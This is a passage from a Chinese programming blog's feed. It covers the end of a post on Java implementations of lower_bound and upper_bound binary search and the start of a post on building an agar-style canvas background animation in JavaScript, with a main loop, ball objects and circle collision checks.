class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; value) &#123;</span><br><span class="line">            begin = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> begin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就得到了一个相对简单的 <code>lower_bound</code> 版本了。</p><h1 id="upper_bound"><a class="markdownIt-Anchor" href="#upper_bound"></a> upper_bound</h1><p><code>upper_bound</code> 会去寻找<strong>大于</strong>value的位置，比如 <code>[1, 2, 3, 3, 3, 4, 7, 8]</code> 查找 <code>3</code> 会返回下标为5的位置，查找 <code>6</code> 会返回下标为6的位置。</p><p>std一种实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">template&lt;class ForwardIt, class T&gt; ForwardIt upper_bound(ForwardIt first, ForwardIt last, const T&amp; value)</span><br><span class="line">&#123;</span><br><span class="line">    ForwardIt it;</span><br><span class="line">    <span class="keyword">typename</span> <span class="built_in">std</span>::iterator_traits&lt;ForwardIt&gt;::difference_type count, step;</span><br><span class="line">    count = <span class="built_in">std</span>::distance(first,last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        it = first;</span><br><span class="line">        step = count / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">std</span>::advance(it, step);</span><br><span class="line">        <span class="keyword">if</span> (!(value &lt; *it)) &#123;</span><br><span class="line">            first = ++it;</span><br><span class="line">            count -= step + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> count = step;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这个实现，我们可以改成以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">upper_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count, step, it;</span><br><span class="line">    count = end - begin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        it = begin;</span><br><span class="line">        step = count / <span class="number">2</span>;</span><br><span class="line">        it += step;</span><br><span class="line">        <span class="keyword">if</span> (nums[it] &lt;= value) &#123;</span><br><span class="line">            begin = ++it;</span><br><span class="line">            count -= step + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = step;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> begin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化版本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">upper_bound</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> begin, <span class="keyword">int</span> end, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt;= value) &#123;</span><br><span class="line">            begin = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> begin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，这两个函数只有 <code>if</code> 判断那一句不同。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p><code>lower_bound</code> 和 <code>upper_bound</code> 的实现借助了 <strong>二分查找</strong> 的思想，二分查找很重要的一点就是对_二分区间的舍弃_。举个例子，<code>lower_bound</code>是找到第一个<strong>大于等于</strong>value的值，那么对于<strong>小于等于</strong>mid的值要果断舍弃，大于mid的值由于可能包含value，需要保守一点。</p><p>这两个函数的实现到这里就结束了，而关于二分里的区间舍弃保留问题，有空学习一下，再水一篇吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Cpp的Std标准库中包含了很多算法，以前写Cpp的时候受益于Std库，确实方便了不少，在Java语言下还是要慢慢适应Java语言的方式。&lt;/p&gt;
&lt;p&gt;Java没有迭代器指针这个概念，所以很多内容与C++有所不同。Java中有二分的实现，叫做&lt;code&gt;java.util</summary>
      
    
    
    
    <category term="算法" scheme="https://sumygg.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://sumygg.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="java" scheme="https://sumygg.com/tags/java/"/>
    
    <category term="c++" scheme="https://sumygg.com/tags/c/"/>
    
    <category term="upper_bound" scheme="https://sumygg.com/tags/upper-bound/"/>
    
    <category term="lower_bound" scheme="https://sumygg.com/tags/lower-bound/"/>
    
    <category term="二分" scheme="https://sumygg.com/tags/%E4%BA%8C%E5%88%86/"/>
    
  </entry>
  
  <entry>
    <title>背景《球球大作战》实现要点</title>
    <link href="https://sumygg.com/2017/08/03/ball-battle-on-my-blog-background/"/>
    <id>https://sumygg.com/2017/08/03/ball-battle-on-my-blog-background/</id>
    <published>2017-08-03T14:48:39.000Z</published>
    <updated>2021-03-16T08:51:03.006Z</updated>
    
    <content type="html"><![CDATA[<p>很早以前有个游戏叫 <code>agar</code> ，就是类似大球吃小球的游戏。最近国内在手游上也出现了类似的游戏，比较好的有《球球大作战》和《疯狂贪吃蛇》。对于这两款游戏，不是很感冒，不过还是想把其中的一些内容提取出来，做成一个博客背景动画。</p><p>从想法到实现花费了大约一天半的时间，具体实现细节可以参考代码，这里只记录一下一些实现难点。</p><h1 id="游戏引擎"><a class="markdownIt-Anchor" href="#游戏引擎"></a> 游戏引擎</h1><p>实现没有用什么游戏引擎，也是自己手写了一个简单的“引擎”，有一个不断通过调用 <code>window.requestAnimationFrame()</code> 实现自身死循环的函数，在函数内部依次调用“绘画对象”的 <code>update</code> 和 <code>draw</code> 方法，来让对象更新自身和绘制自身。</p><p>简化代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line"><span class="built_in">this</span>.mainLoop = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isRunning) &#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame(that.mainLoop); <span class="comment">// 循环自身</span></span><br><span class="line">    &#125;</span><br><span class="line">    update(); <span class="comment">// 更新</span></span><br><span class="line">    draw(); <span class="comment">// 绘制</span></span><br><span class="line">    cleanup(); <span class="comment">// 清理过期对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.mainLoop();</span><br></pre></td></tr></table></figure><h1 id="对象管理"><a class="markdownIt-Anchor" href="#对象管理"></a> 对象管理</h1><p>需要被管理的对象放置在一个array里（不知道JavaScript对这类数据结构叫什么），每个对象（Object）都有自己的数据和函数，类似于下面的样子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spritObject</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        update: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">        draw: <span class="function"><span class="keyword">function</span>(<span class="params">ctx</span>) </span>&#123;&#125;</span><br><span class="line">        isDead: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>obj</code> 中可以存储对象的私有数值，比如小球的位置（坐标）、小球的大小（半径）、小球的速度、小球的加速度等等。<code>update</code> 每一帧会被调用一次，可以更新小球的状态。<code>draw</code> 每一帧会被调用一次，之前Canvas画布会被提前清空，这个时候，小球需要重新绘制自己的样式。 <code>isDead</code> 用于判断当前对象是否还有用，没用的对象会在下个周期被从Array中清理出去。</p><p>附一段清理的代码，其实就是从Array中删除元素的代码，我才发现我上个版本的清理代码中有个函数写错了<img class="emoji" draggable="false" alt="😓" src="https://twemoji.maxcdn.com/2/72x72/1f613.png"/>。（我把 <code>splice</code> 写成了 <code>split</code>，幸亏上个背景的对象不用被清理。<img class="emoji" draggable="false" alt="😋" src="https://twemoji.maxcdn.com/2/72x72/1f60b.png"/>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.list[i].isDead()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list.splice(i, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小球"><a class="markdownIt-Anchor" href="#小球"></a> 小球</h1><p>小球是动画里角色的基本样式，一切行为和绘制都围绕着圆形球来进行。我将小球根据功能划分为三类：球球、食物和刺球。<strong>球球</strong> 通过吃食物和其它小点的球球来增大自身，<strong>食物</strong> 就是被球球吃的，<strong>刺球</strong> 是作为限制球球无限增长的角色存在的。</p><p>小球最基本的定义为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ball = &#123;</span><br><span class="line">    type: ,  <span class="comment">// 小球类型（球球、食物、刺球）</span></span><br><span class="line">    x: ,     <span class="comment">// 当前x坐标</span></span><br><span class="line">    y: ,     <span class="comment">// 当前y坐标</span></span><br><span class="line">    vx: ,    <span class="comment">// x方向速度，每帧x方向移动的距离</span></span><br><span class="line">    vy: ,    <span class="comment">// y方向速度</span></span><br><span class="line">    size: ,  <span class="comment">// 小球的面积</span></span><br><span class="line">    radius: ,<span class="comment">// 小球半径</span></span><br><span class="line">    isDead: ,<span class="comment">// 小球是否需要被清理</span></span><br><span class="line">    age: ,   <span class="comment">// 小球当前存活帧数（保护期使用）</span></span><br><span class="line">    color:   <span class="comment">// 小球的颜色</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>不同类型的小球只是其中的一些属性不同，比如，食物和刺球不移动，那么它们的vx和vy都为0（实际上，就没执行这两类的update函数）。</p><img src="/2017/08/03/ball-battle-on-my-blog-background/1.png" class="" title="小球类型"><p>小球的绘制其实就是在(x, y)坐标的位置画一个radius半径的圆，并填充颜色。</p><h1 id="碰撞检测"><a class="markdownIt-Anchor" href="#碰撞检测"></a> 碰撞检测</h1><p>说到碰撞检测，这里不得不说一下物理上面的知识，小球们的碰撞被分为两种情况：</p><h2 id="球球-vs-刺球"><a class="markdownIt-Anchor" href="#球球-vs-刺球"></a> (球球 vs 刺球)</h2><p>这类使用的是“碰”策略，两个物体碰到一起就会触发操作。主要判断的思想是<strong>两个物体圆心的距离 小于等于 两物体半径之和</strong>，这里用公式就是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><msub><mi>o</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>o</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>&lt;</mo><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">dis(o_1, o_2) &lt;= r_1 + r_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><img src="/2017/08/03/ball-battle-on-my-blog-background/2.png" class="" title="小球外切"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 刺球判断</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>._prick.list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> prick = <span class="built_in">this</span>._prick.list[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="built_in">this</span>._balls.list.length; j++) &#123;</span><br><span class="line">        <span class="keyword">var</span> ball = <span class="built_in">this</span>._balls.list[j];</span><br><span class="line">        <span class="keyword">if</span> (ball.isDead) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (prick.isDead) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (prick.size &gt; ball.size) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">var</span> dis = <span class="built_in">Math</span>.sqrt((ball.x - prick.x) * (ball.x - prick.x) + (ball.y - prick.y) * (ball.y - prick.y));</span><br><span class="line">        <span class="keyword">if</span> (dis &lt;= ball.radius + prick.radius) &#123;</span><br><span class="line">            ball.isDead = <span class="literal">true</span>;</span><br><span class="line">            prick.isDead = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//TODO：球球分裂</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先保证球球和刺球都是存活的，然后计算球球和刺球圆心的距离，如果距离小于两个小球的半径之和，然后就可以清理掉这两个小球了。</p><h2 id="球球-vs-球球-or-球球-vs-食物"><a class="markdownIt-Anchor" href="#球球-vs-球球-or-球球-vs-食物"></a> (球球 vs 球球) or (球球 vs 食物)</h2><p>这类使用的是“包含”策略，当半径大的物体完全包含半径小的物体的时候触发操作。主要判断思想是<strong>两个物体圆心的距离 和 小圆半径之和 小于等于 大圆半径</strong>，使用公式描述一下 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><msub><mi>o</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>o</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo>&lt;</mo><mo>=</mo><msub><mi>r</mi><mn>1</mn></msub><mi mathvariant="normal">，</mi><mi mathvariant="normal">其</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">，</mi><msub><mi>r</mi><mn>1</mn></msub><mo>&gt;</mo><msub><mi>r</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">dis(o_1, o_2) + r_2 &lt;= r_1，其中， r_1&gt;r_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><img src="/2017/08/03/ball-battle-on-my-blog-background/3.png" class="" title="小球内切"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 球球吃球球</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>._balls.list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> balla = <span class="built_in">this</span>._balls.list[i];</span><br><span class="line">    <span class="keyword">if</span> (balla.age &lt; <span class="built_in">this</span>._balls.opts.protectedAge) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; <span class="built_in">this</span>._balls.list.length; j++) &#123;</span><br><span class="line">        <span class="keyword">var</span> ballb = <span class="built_in">this</span>._balls.list[j];</span><br><span class="line">        <span class="keyword">if</span> (ballb.isDead) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (balla.isDead) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (ballb.age &lt; <span class="built_in">this</span>._balls.opts.protectedAge) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">var</span> dis = <span class="built_in">Math</span>.sqrt((balla.x - ballb.x) * (balla.x - ballb.x) + (balla.y - ballb.y) * (balla.y - ballb.y));</span><br><span class="line">        <span class="keyword">if</span> (balla.radius &lt; ballb.radius &amp;&amp; dis + balla.radius &lt;= ballb.radius) &#123;</span><br><span class="line">            ballb.size += balla.size;</span><br><span class="line">            ballb.radius = <span class="built_in">Math</span>.sqrt(ballb.size / <span class="built_in">Math</span>.PI);</span><br><span class="line">            balla.isDead = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ballb.radius &lt; balla.radius &amp;&amp; dis + ballb.radius &lt;= balla.radius) &#123;</span><br><span class="line">            balla.size += ballb.size;</span><br><span class="line">            balla.radius = <span class="built_in">Math</span>.sqrt(balla.size / <span class="built_in">Math</span>.PI);</span><br><span class="line">            ballb.isDead = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断球球是否在保护期，在保护期的球球直接跳过。判断半径的大小，根据半径大小应用上面的公式。</p><h1 id="刺球绘制"><a class="markdownIt-Anchor" href="#刺球绘制"></a> 刺球绘制</h1><p>刺球的绘制单独拿出来说一下，相比球球来说，刺球外面多了一层刺的形状。</p><img src="/2017/08/03/ball-battle-on-my-blog-background/5.png" class="" title="刺球"><p>说起刺的形状，就像起伏的山峰一样，说到起伏的山峰，就想到了<code>sin</code>，恩恩。这里把<code>sin</code>的值量化一下，用线连起来就成了山峰的形状了。</p><img src="/2017/08/03/ball-battle-on-my-blog-background/4.png" class="" title="sin量化连线"><p>之后怎么将这个“变化”应用到曲面上。我们可以通过<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mi>r</mi><mo separator="true">⋅</mo><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mi mathvariant="normal">和</mi><mi>y</mi><mo>=</mo><mi>r</mi><mo separator="true">⋅</mo><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=r·cos(a)和y=r·sin(a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span 